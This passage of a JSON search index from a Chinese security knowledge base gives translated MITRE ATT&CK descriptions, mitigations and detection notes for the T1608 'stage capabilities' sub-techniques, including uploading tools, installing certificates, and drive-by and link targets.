\u6237\u6267\u884c\u6216\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1608-001</p> <p>https://attack.mitre.org/techniques/T1608/001/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/","title":"T1608-002-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u5de5\u5177","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u76ee\u6807\u653b\u51fb\u671f\u95f4\u53ef\u4ee5\u4f7f\u7528\u3002\u5de5\u5177\u53ef\u4ee5\u662f\u5f00\u653e\u6216\u95ed\u6e90\u7684\uff0c\u514d\u8d39\u6216\u5546\u4e1a\u7684\u3002\u5de5\u5177\u53ef\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u6076\u610f\u76ee\u7684\uff0c\u4f46\u8fd9\u4e9b\u5de5\u5177\u7684\u8bbe\u8ba1\u521d\u8877\uff08\u4e0e\u6076\u610f\u8f6f\u4ef6\u4e0d\u540c\uff09\u5e76\u4e0d\u6253\u7b97\u7528\u4e8e\u8fd9\u4e9b\u76ee\u7684\uff08\u4f8b\u5982\uff1aPsExec\uff09\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u5de5\u5177\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u5de5\u5177\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u8ba9\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\uff0c\u4ee5\u5b9e\u73b0\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002</p> <p>\u5de5\u5177\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u653b\u51fb\u8005\u4e4b\u524d\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u8005\u88ab\u4ed6\u4eec\u4ee5\u5176\u4ed6\u65b9\u5f0f\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u5de5\u5177\u4e5f\u53ef\u4ee5\u88ab\u653e\u7f6e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u4f8b\u5982\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub repo\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8ba9\u88ab\u653b\u51fb\u7684\u53d7\u5bb3\u8005\u673a\u5668\u76f4\u63a5\u4ece\u7b2c\u4e09\u65b9\u6258\u7ba1\u4f4d\u7f6e\uff08\u4f8b\u5982\uff1a\u975e\u653b\u51fb\u8005\u63a7\u5236\u7684GitHub repo\uff09\u4e0b\u8f7d\u5de5\u5177\uff0c\u5305\u62ec\u5de5\u5177\u7684\u539f\u59cb\u6258\u7ba1\u7f51\u7ad9\uff0c\u6765\u907f\u514d\u4e0a\u4f20\u5de5\u5177\u7684\u9700\u8981\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_8","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u5982\u5165\u4fb5\u5de5\u5177\u8f6c\u79fb\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-002-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1608-002</p> <p>https://attack.mitre.org/techniques/T1608/002/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/","title":"T1608-003-\u9636\u6bb5\u6027\u80fd\u529b-\u5b89\u88c5\u6570\u5b57\u8bc1\u4e66","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u5728\u653b\u51fb\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4f7f\u7528\u3002SSL/TLS\u8bc1\u4e66\u662f\u53ef\u4ee5\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u4ee5\u5b9e\u73b0\u7cfb\u7edf\u4e4b\u95f4\u7684\u5b89\u5168\u901a\u4fe1\u3002\u6570\u5b57\u8bc1\u4e66\u5305\u62ec\u5173\u4e8e\u5bc6\u94a5\u7684\u4fe1\u606f\uff0c\u5173\u4e8e\u5176\u6240\u6709\u8005\u8eab\u4efd\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5b9e\u4f53\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u8be5\u5b9e\u4f53\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u8bc1\u4e66\u7684\u5185\u5bb9\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u7b7e\u540d\u662f\u6709\u6548\u7684\uff0c\u5e76\u4e14\u68c0\u67e5\u8bc1\u4e66\u7684\u4eba\u4fe1\u4efb\u7b7e\u540d\u8005\uff0c\u90a3\u4e48\u4ed6\u4eec\u77e5\u9053\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u94a5\u5319\u4e0e\u5b83\u7684\u6240\u6709\u8005\u8fdb\u884c\u5b89\u5168\u901a\u4fe1\u3002\u8bc1\u4e66\u53ef\u4ee5\u88ab\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e\u670d\u52a1\u5668\u53ef\u4ee5\u88ab\u914d\u7f6e\u4e3a\u4f7f\u7528\u8bc1\u4e66\u6765\u5b9e\u73b0\u4e0e\u5b83\u7684\u52a0\u5bc6\u901a\u4fe1\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5SSL/TLS\u8bc1\u4e66\uff0c\u7528\u6765\u63a8\u8fdb\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u5982\u52a0\u5bc6C2\u6d41\u91cf\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u534f\u8bae\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u6cd5\uff09\uff0c\u6216\u5c06\u53ef\u4fe1\u5ea6\u501f\u7ed9\u8bc1\u4e66\u91c7\u96c6\u7f51\u7ad9\u3002\u6570\u5b57\u8bc1\u4e66\u7684\u5b89\u88c5\u53ef\u80fd\u53d1\u751f\u5728\u4e00\u4e9b\u670d\u52a1\u5668\u7c7b\u578b\u4e0a\uff0c\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\u548c\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u5668\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u6216\u521b\u5efa\u81ea\u7b7e\u540d\u7684\u8bc1\u4e66\u3002\u7136\u540e\uff0c\u6570\u5b57\u8bc1\u4e66\u53ef\u4ee5\u88ab\u5b89\u88c5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u662f\u5df2\u7ecf\u83b7\u5f97\u7684\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\u7684\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_8","title":"\u68c0\u6d4b","text":"<p>\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u6574\u4e2a\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u4ee5\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u4e3a\u652f\u70b9\uff0c\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u6216\u975e\u5bf9\u79f0\u5bc6\u7801\u5b66\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-003-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E5%AE%89%E8%A3%85%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1608-003</p> <p>https://attack.mitre.org/techniques/T1608/003/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/","title":"T1608-004-\u9636\u6bb5\u6027\u80fd\u529b-Drive-by Target","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u51c6\u5907\u4e00\u4e2a\u64cd\u4f5c\u73af\u5883\u6765\u611f\u67d3\u5728\u6b63\u5e38\u6d4f\u89c8\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u7f51\u7ad9\u7684\u7cfb\u7edf\u3002\u7aef\u70b9\u7cfb\u7edf\u53ef\u80fd\u901a\u8fc7\u6d4f\u89c8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u800c\u88ab\u5165\u4fb5\uff0c\u5c31\u50cfDrive-by Compromise\u4e2d\u7684\u60c5\u51b5\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u901a\u5e38\u662f\u5229\u7528\u7684\u76ee\u6807\uff08\u4e00\u65e6\u767b\u9646\u7f51\u7ad9\uff0c\u901a\u5e38\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u7684\u7528\u6237\u4e92\u52a8\uff09\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4e3a\u975e\u5229\u7528\u884c\u4e3a\uff08\u5982\u5e94\u7528\u8bbf\u95ee\u6807\u8bb0\uff09\u8bbe\u7f6e\u7f51\u7ad9\u3002\u5728\u8fdb\u884c\u201c\u5077\u6e21\u5f0f\u201d\u7834\u574f\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u51c6\u5907\u597d\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u4ee5\u4fbf\u5411\u6d4f\u89c8\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u7f51\u7ad9\u7684\u7528\u6237\u63d0\u4f9b\u8fd9\u79cd\u5229\u7528\u3002\u5077\u6e21\u5185\u5bb9\u53ef\u4ee5\u5728\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u4e0a\u6f14\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u5df2\u7ecf\u83b7\u5f97\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u4ee5\u524d\u88ab\u7834\u574f\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6216\u6ce8\u5165\u6076\u610f\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982JavaScript\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5305\u62ec\u5c06\u6076\u610f\u811a\u672c\u63d2\u5165\u7f51\u9875\u6216\u5176\u4ed6\u7528\u6237\u53ef\u63a7\u5236\u7684\u7f51\u7edc\u5185\u5bb9\uff0c\u5982\u8bba\u575b\u5e16\u5b50\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5236\u4f5c\u6076\u610f\u7684\u7f51\u7edc\u5e7f\u544a\uff0c\u5e76\u901a\u8fc7\u5408\u6cd5\u7684\u5e7f\u544a\u4f9b\u5e94\u5546\u8d2d\u4e70\u7f51\u7ad9\u4e0a\u7684\u5e7f\u544a\u7a7a\u95f4\u3002\u9664\u4e86\u653e\u7f6e\u5185\u5bb9\u4ee5\u5229\u7528\u7528\u6237\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u653e\u7f6e\u811a\u672c\u5185\u5bb9\u6765\u63cf\u8ff0\u7528\u6237\u7684\u6d4f\u89c8\u5668\uff08\u5982\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f\uff09\uff0c\u4ee5\u786e\u4fdd\u5176\u5728\u5c1d\u8bd5\u5229\u7528\u524d\u662f\u8106\u5f31\u7684\u3002</p> <p>\u88ab\u653b\u51fb\u8005\u653b\u7834\u5e76\u7528\u4e8e\u5b9e\u65bd\u5077\u6e21\u7684\u7f51\u7ad9\u53ef\u80fd\u662f\u7279\u5b9a\u7fa4\u4f53\u8bbf\u95ee\u7684\u7f51\u7ad9\uff0c\u5982\u653f\u5e9c\u3001\u7279\u5b9a\u884c\u4e1a\u6216\u5730\u533a\uff0c\u5176\u76ee\u7684\u662f\u57fa\u4e8e\u5171\u540c\u7684\u5174\u8da3\uff0c\u653b\u7834\u7279\u5b9a\u7528\u6237\u6216\u4e00\u7ec4\u7528\u6237\u3002\u8fd9\u79cd\u6709\u9488\u5bf9\u6027\u7684\u653b\u51fb\u88ab\u79f0\u4e3a\u6218\u7565\u7f51\u7edc\u653b\u51fb\u6216\u6c34\u5751\u653b\u51fb\u3002</p> <p>\u653b\u51fb\u8005\u5728\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\uff08\u57df\u540d\uff09\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u8d2d\u4e70\u4e0e\u5408\u6cd5\u57df\u540d\u7c7b\u4f3c\u7684\u57df\u540d\uff08\u4f8b\u5982\uff1a\u540c\u97f3\u5b57\u3001\u9519\u522b\u5b57\u3001\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u7b49\uff09\uff0c\u4ee5\u5e2e\u52a9\u4fc3\u8fdb\u5077\u6e21\u5f0f\u7834\u574f\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_8","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u7684\u5927\u90e8\u5206\u5c06\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\uff0c\u4f8b\u5982\u901a\u8fc7\u59a5\u534f\u6216\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-004-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Drive-by%20Target/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1608-004</p> <p>https://attack.mitre.org/techniques/T1608/004/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/","title":"T1608-005-\u9636\u6bb5\u6027\u80fd\u529b-Link Target","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-005-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-Link%20Target/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u94fe\u63a5\u6240\u5f15\u7528\u7684\u8d44\u6e90\u653e\u5728\u9002\u5f53\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4fbf\u5728\u9488\u5bf9\u7279\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f9d\u9760\u7528\u6237\u70b9\u51fb\u4e00\u4e2a\u6076\u610f\u94fe\u63a5\u6765\u6cc4\u9732\u4fe1\u606f\uff08\u5305\u62ec\u8bc1\u4e66\uff09\u6216\u83b7\u5f97\u6267\u884c\uff0c\u5982\u6076\u610f\u94fe\u63a5\u3002\u94fe\u63a5\u53ef\u7528\u4e8e\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\uff0c\u5982\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u5e76\u4f34\u6709\u793e\u4f1a\u5de5\u7a0b\u6587\u672c\uff0c\u4ee5\u54c4\u9a97\u7528\u6237\u4e3b\u52a8\u70b9\u51fb\u6216\u5728\u6d4f\u89c8\u5668\u4e2d\u590d\u5236\u548c\u7c98\u8d34\u4e00\u4e2aURL\u3002\u5728\u7f51\u7edc\u9493\u9c7c\u83b7\u53d6\u4fe1\u606f\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u6216\u7f51\u7edc\u9493\u9c7c\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u521d\u59cb\u8bbf\u95ee\uff08\u5982\u9c7c\u53c9\u5f0f\u94fe\u63a5\uff09\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u4e3a\u9c7c\u53c9\u5f0f\u94fe\u63a5\u7684\u94fe\u63a5\u76ee\u6807\u8bbe\u7f